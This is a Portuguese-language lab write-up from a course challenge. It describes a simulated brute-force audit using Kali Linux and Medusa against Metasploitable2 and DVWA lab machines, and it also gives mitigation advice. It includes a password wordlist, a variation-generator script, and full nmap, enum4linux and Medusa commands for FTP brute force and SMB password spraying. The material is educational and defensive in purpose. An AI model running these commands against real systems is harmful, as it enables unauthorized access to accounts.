---

# Desafio DIO — Força Bruta com Kali Linux + Medusa (Entrega Completa — Simulação)

# **Aviso legal**: todo o conteúdo deste repositório é uma **simulação educativa**. As evidências, IPs e credenciais apresentadas são **sanitizadas** e fictícias. Não execute testes contra sistemas que você não possui ou sem autorização expressa.

---

## Sumário
1. Sumário Executivo  
2. Objetivos do projeto  
3. Escopo e limitações  
4. Ambiente utilizado (simulado)  
5. Metodologia detalhada  
6. Wordlists e scripts (conteúdo incluído)  
7. Comandos executados (sanitizados) e logs de saída (simulados)  
8. Evidências (referências sanitizadas)  
9. Métricas e resultados (simulados)  
10. Análise, conclusões e recomendações de mitigação  
11. Estrutura do repositório e arquivos incluídos  
12. Checklist de entrega (para professor/a)  
13. Como reproduzir o laboratório (passo-a-passo)  
14. Observações legais e contato

---

## 1 — Sumário Executivo
Este trabalho apresenta uma simulação de auditoria por força bruta em ambiente controlado, utilizando **Kali Linux** (atacante) e VMs vulneráveis (**Metasploitable2** e **DVWA**) em rede host-only. Ferramenta principal: **Medusa**.  

Resumo dos resultados simulados:
- **FTP (vsftpd):** 200 tentativas → 1 credencial válida (LAB_USER / LAB_PASS) — taxa de sucesso **0,5%**.  
- **DVWA (form login, modo Low):** 120 tentativas → **0 sucessos**.  
- **SMB (password spraying):** 30 usuários testados com 1 senha → **0 sucessos**.

Recomendações principais: bloqueio temporário após 5 tentativas, rate limiting por IP/conta, e implantação de MFA.

---

## 2 — Objetivos do projeto
- Demonstrar ataques de força bruta e password spraying em serviços FTP, Web (form) e SMB em ambiente de laboratório.  
- Utilizar Medusa para automação e registrar evidências.  
- Gerar documentação técnica e recomendações de mitigação para publicação no GitHub como portfólio.

---

## 3 — Escopo e limitações
- **Escopo:** VMs em rede host-only: FTP (vsftpd), HTTP (DVWA), SMB (smbd).  
- **Não incluído:** técnicas de evasão, redes públicas, engenharia social, exploração de zero-days.  
- **Limitação:** simulação; evidências e logs são fictícios e sanitizados.

---

## 4 — Ambiente utilizado (simulado)
- Host: VirtualBox (rede Host-only 192.168.56.0/24)  
- Attacker VM: **Kali Linux 2024.4** — IP: `192.168.56.10`  
  - Ferramentas: `medusa`, `nmap`, `enum4linux`, `curl`, `python3`  
- Alvo VM 1: **Metasploitable2** — IP: `192.168.56.20` (FTP 21 / HTTP 80 / SMB 445)  
- Alvo VM 2: **DVWA (modo Low)** — IP: `192.168.56.30`  
- Snapshot criado em cada VM antes dos testes (naming: `*-clean`)  
- Fuso horário dos registros: **America/Sao_Paulo**

---

## 5 — Metodologia (detalhada)
1. **Descoberta**: `nmap` para identificar serviços e versões.  
2. **Preparação**: gerar wordlists pequenas (50–200 entradas) com script local.  
3. **Execução controlada**:
   - Limitar threads (`-t`) e usar `-f`/parâmetros que evitem saturar a VM alvo.
   - Registrar hora de início/fim, número de tentativas, e saída.
4. **Validação**: capturas de tela da sessão autenticada (sanitizadas) e logs salvos.
5. **Análise**: calcular métricas (tentativas, sucessos, taxa, duração).
6. **Mitigação**: priorizar controles curtos, médios e longos prazos.
7. **Documentação**: README + REPORT + evidências sanitizadas.

---

## 6 — Wordlists e scripts (conteúdo incluso)
### `wordlists/mini.txt` (exemplo pronto — 60 entradas, fictícias)
admin  
admin123  
admin2025  
admin!  
labuser  
labuser123  
labuser2025  
labuser!  
msfadmin  
msfadmin123  
msfadmin2025  
msfadmin!  
password  
password1  
password123  
teste  
teste123  
teste2025  
teste!  
qwerty  
qwerty123  
welcome  
welcome1  
123456  
letmein  
changeme  
user  
user123  
user2025  
root  
root123  
root2025  
guest  
guest123  
pwd123  
admin@123  
lab@123  
msf@123  
user!23  
test@2025  
123qwe  
pass@123  
senha123  
senha@2025  
office123  
office2025  
company1  
company123  
work123  
work2025  
portal123  
portal@123  
webadmin  
webadmin123  
sitepass  
site123  
demo  
demo123  
devpass  
dev123

### `wordlists/users.txt` (exemplo de usuários para spray)
msfadmin  
labuser  
admin  
guest  
test  
user  
dev

### `scripts/gera_variacoes.py` (script para gerar variações simples)
```python
#!/usr/bin/env python3
# gera_variacoes.py — gera mini wordlist a partir de nomes base
names = ["admin","msfadmin","labuser","user","test","guest","root","dev"]
suffixes = ["","123","2025","!","@123","@2025"]
out = "wordlists/mini_generated.txt"

with open(out, "w") as f:
    for n in names:
        for s in suffixes:
            f.write(f"{n}{s}\n")

print(f"Wordlist gerada: {out}")
````

> Recomendação prática: **coloque a wordlist em arquivo separado** no repositório (`wordlists/mini.txt`) — isso evita que leitores/previewers do GitHub ou do seu editor “quebrem” a renderização do README.

---

## 7 — Comandos executados e logs de saída (sanitizados)

### 7.1 Descoberta — nmap

**Comando:**

```bash
nmap -sV -p21,80,139,445 192.168.56.20 -oN nmap/nmap_metasp_192.168.56.20.txt
```

**Trecho da saída (sanitizada):**

```
Nmap scan report for 192.168.56.20
Host is up (0.0012s latency).

PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.3.4
80/tcp  open  http    Apache httpd 2.2.8
139/tcp open  netbios-ssn Samba smbd 3.X
445/tcp open  netbios-ssn Samba smbd 3.X
```

### 7.2 FTP — Medusa (força bruta)

**Comando (sanitizado):**

```bash
medusa -h 192.168.56.20 -u LAB_USER -P wordlists/mini.txt -M ftp -t 3 -f -O evidence/medusa_ftp_output.txt
```

**Trecho do log (simulado):**

```
[22:01:12] [INFO] 192.168.56.20:21 (ftp) - trying LAB_USER:admin
[22:01:13] [INFO] 192.168.56.20:21 (ftp) - trying LAB_USER:admin123
...
[22:01:18] [SUCCESS] 192.168.56.20:21 (ftp) - login: 'LAB_USER' password: 'LAB_PASS'
```

**Evidência gerada (simulada):** `evidence/ftp_session_list_lab_sanitized.png` — screenshot com listagem de diretório.

### 7.3 DVWA — Automação de formulário (modo Low)

**Fluxo (conceitual):**

```bash
# obter token/cookies (se aplicável)
curl -s -c cookies.txt http://192.168.56.30/vulnerabilities/brute/
# submeter POSTs em loop (script python/bash) com wordlist/mini.txt
```

**Resultado (simulado):**

* 120 tentativas automatizadas; nenhuma resposta indicando sucesso de autenticação.
* Log salvo: `evidence/dvwa_attempts_log.txt` (trechos sanitizados).

### 7.4 SMB — Enumeração + Password spraying

**Enumeração (exemplo):**

```bash
enum4linux -a 192.168.56.20 > nmap/enum4linux_output.txt
```

**Trecho (simulado):**

```
Users on 192.168.56.20
  - msfadmin
  - labuser
  - test
  - guest
```

**Password spraying (Medusa, simul.):**

```bash
medusa -h 192.168.56.20 -U wordlists/users.txt -p 'SenhaComum123' -M smb -t 2 -O evidence/medusa_smb_output.txt
```

**Resultado:** 30 usuários testados, 0 logins válidos.

---

## 8 — Evidências (referências sanitizadas)

> Observação: neste repositório público as imagens estão **referenciadas** e sanitizadas. Em entrega privada inclua as imagens originais.

Arquivos de evidência (nomes e propósito):

* `evidence/medusa_ftp_output.txt` — log do Medusa (com sucesso sanitizado).
* `evidence/ftp_session_list_lab_sanitized.png` — screenshot mostrando listagem de diretório FTP após login.
* `evidence/dvwa_attempts_log.txt` — trechos de log das tentativas DVWA.
* `nmap/nmap_metasp_192.168.56.20.txt` — saída do nmap.
* `nmap/enum4linux_output.txt` — enumeração SMB.

Formato recomendado: PNG (capturas) e TXT (logs). Nomeie arquivos com timestamp, ex.: `ftp_success_2025-10-29_220118.png`.

---

## 9 — Métricas e resultados (simulados)

| Cenário      | Tentativas | Sucessos | Taxa (%) |  Duração |
| ------------ | ---------: | -------: | -------: | -------: |
| FTP (Medusa) |        200 |        1 |     0.50 | 00:07:30 |
| DVWA (form)  |        120 |        0 |     0.00 | 00:05:10 |
| SMB (spray)  |         30 |        0 |     0.00 | 00:02:15 |

Métricas coletadas: número de tentativas, tempo total, credenciais válidas, taxa de sucesso, e logs de sistema do alvo (quando disponíveis).

---

## 10 — Análise, conclusões e recomendações

### Análise

* A credencial encontrada demonstra que senhas fracas/óbvias facilitam sucesso em ataques automatizados.
* Aplicações web em modo `low` são facilmente automatizadas; proteção adicional (CAPTCHA, rate limiting) é necessária.
* Password spraying mostrou-se ineficaz neste teste simulado, mas continua um vetor relevante contra organizações com contas fracas.

### Recomendações (priorizadas)

**Curto prazo**

* Bloqueio automático após N tentativas (ex.: 5) por usuário.
* Rate limiting por IP e por conta.
* Forçar senhas mínimas (comprimento e complexidade).

**Médio prazo**

* Implementar MFA (OTP/TOTP) em serviços críticos.
* Remover contas padrão e revisar usuários com privilégios.
* Atualizar e patchar serviços (vsftpd, samba, Apache).

**Longo prazo**

* Centralizar autenticação (AD/LDAP) com políticas fortes.
* Implementar WAF e proteção em formulários web.
* Programa de testes periódicos e conscientização.

---

## 11 — Como reproduzir (passo-a-passo - ambiente real)

> Só reproduza se tiver VMs em rede isolada e autorização adequada.

1. Preparação do ambiente:

   * Crie rede Host-only no VirtualBox (ex.: 192.168.56.0/24).
   * Importe/instale VMs: Kali Linux, Metasploitable2 e DVWA (ou configurar DVWA em servidor Apache).
   * Configure IPs (ex.: Kali `192.168.56.10`, Metasploitable2 `192.168.56.20`, DVWA `192.168.56.30`).
   * Crie snapshots `*-clean`.
2. Ferramentas no Kali:

   * `sudo apt update && sudo apt install -y medusa nmap enum4linux curl python3`
3. Descoberta:

   * `nmap -sV -p- 192.168.56.20 -oN nmap_full.txt`
4. Preparar wordlists:

   * Use `scripts/gera_variacoes.py` ou `wordlists/mini.txt`.
5. Executar Medusa (FTP):

   * `medusa -h 192.168.56.20 -u LAB_USER -P wordlists/mini.txt -M ftp -t 3 -f -O evidence/medusa_ftp_output.txt`
6. DVWA:

   * Ajuste DVWA para modo `low`; use curl/hydra/wfuzz para submissões controladas.
7. SMB:

   * `enum4linux -a 192.168.56.20` → `medusa -h 192.168.56.20 -U wordlists/users.txt -p 'SenhaComum123' -M smb`
8. Capturar evidências:

   * Salve logs e screenshots; sanitize antes de publicar.
9. Analisar métricas e gerar relatório (REPORT.md/PDF).

  
---

FIM DO README

```
